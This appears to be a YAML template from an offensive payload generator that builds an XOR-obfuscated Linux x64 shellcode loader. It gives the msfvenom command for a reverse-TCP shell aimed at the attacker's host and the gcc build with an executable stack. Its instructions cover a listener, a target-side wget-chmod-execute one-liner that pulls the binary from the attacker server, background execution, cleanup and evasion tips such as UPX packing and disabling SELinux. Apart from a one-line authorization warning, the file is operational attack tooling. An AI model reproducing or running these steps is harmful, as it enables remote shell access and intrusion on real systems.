meta:
  name: "Linux Shellcode Loader, XOR (C)*"
  category: "Shellcode Execution"
  description: |
    Simple XOR-encrypted shellcode loader for Linux x64 systems.

    Features:
    - XOR encryption for basic obfuscation (key: 0xfa)
    - Runtime decryption
    - Direct shellcode execution via function pointer
    - Executable stack required (-z execstack)
    - Minimal footprint

    This is a straightforward loader suitable for initial access on Linux targets.
    The executable stack requirement may trigger security warnings on hardened systems.

    WARNING: For authorized security testing only!

  effectiveness: "low"

  mitre:
    tactic: "TA0002 - Execution"
    technique: "T1059.004 - Command and Scripting Interpreter: Unix Shell"

  artifacts:
    - "Executable stack (security warning)"
    - "XOR-decoded shellcode in memory"
    - "Direct shellcode execution"
    - "Network connection to C2 server (if reverse shell)"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker/C2 server IP address for reverse connection"
    required: true

  - name: "lport"
    type: "port"
    description: "Listener port on attacker machine"
    required: true
    default: 443

  - name: "xor_key"
    type: "hex"
    description: "XOR encryption key (single byte, e.g., 'fa')"
    required: false
    default: fa

  - name: "output_file"
    type: "string"
    description: "Output executable filename"
    required: false
    default: "loader"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing:
  # Step 1: Generate raw shellcode using msfvenom
  - type: "command"
    name: "generate_shellcode"
    command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f raw"
    output_var: "raw_shellcode"

  # Step 2: XOR encrypt the shellcode
  - type: "script"
    name: "xor_encryption"
    script: "xor_encrypt.py"
    args:
      data: "{{ raw_shellcode }}"
      key: "{{ xor_key }}"
    output_var: "xor_result"

  # Step 3: Format encrypted shellcode as C byte array
  - type: "script"
    name: "format_payload"
    script: "format_c.py"
    args:
      data: "{{ xor_result.encrypted }}"
      var_name: "buf"
      bytes_per_line: 15
    output_var: "c_payload"

output:
  type: "template"
  template: "shellcode_runner/linux_simple_loader.c"
  compile:
    enabled: true
    command: "gcc -o {{ output_path }}/{{ output_file }} {{ source_file }} -z execstack"
  launch_instructions: |
    # Start Listener

    ```bash
    nc -lvnp {{ lport }}
    ```

    Or with Metasploit:
    ```bash
    msfconsole -x \"use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j\"
    ```

    # Transfer and Execute

    **Attacker:**
    ```bash
    python3 -m http.server 80
    ```

    **Target:**
    ```bash
    wget http://{{ lhost }}:/{{ output_file }} -O /tmp/{{ output_file }} && chmod +x /tmp/{{ output_file }} && /tmp/{{ output_file }}
    ```

    # Background Execution

    ```bash
    nohup /tmp/{{ output_file }} > /dev/null 2>&1 &
    ```

    # Noteses

    - XOR encrypted with key: `0x{{ xor_key }}`
    - Requires executable stack (`-z execstack` linker flag)
    - Works on x64 Linux systems
    - Minimal evasion (basic XOR only)
    - Executable stack may trigger security warnings on hardened systems
    - Reverse shell connects to `{{ lhost }}:{{ lport }}`
    - Consider stripping binary (`strip {{ output_file }}`) or packing with UPX for additional evasion
    - Alternative payloads: bind shell (`msfvenom -p linux/x64/shell_bind_tcp`), Meterpreter

    # Troubleshooting

    - **Segmentation fault:** Ensure target is x64 Linux; check `uname -m` (should be x86_64)
    - **Permission denied:** Run `chmod +x {{ output_file }}`
    - **No connection:** Check firewall rules on attacker (allow `{{ lport }}/tcp`)
    - **Executable stack warning:** Expected behavior; required for shellcode execution
    - **NX bit enabled:** Executable stack flag should bypass this
    - **SELinux blocks:** Check with `getenforce`; may need to disable or adjust policy

    # Cleanup

    **Target:**
    ```bash
    pkill -f {{ output_file }}
    rm -f /tmp/{{ output_file }}
    ```
